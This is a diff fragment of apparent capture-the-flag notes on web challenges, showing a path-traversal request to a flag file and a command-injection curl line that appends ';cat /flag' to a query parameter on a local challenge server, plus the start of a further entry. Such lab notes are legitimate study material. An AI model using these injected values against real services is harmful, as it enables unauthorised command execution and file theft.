@@ -57,3 +57,8 @@ DEBUG: requested_path='/challenge/files/fortunes/../../../flag'
 #### CMDi 4
 
 `curl "http://challenge.localhost:80/quest?timezone=MST;cat+/flag"`
+
+#### CMDi 5
+
+it seems that we can't even know the delay, it just immediately prints the
+output that contains our command.
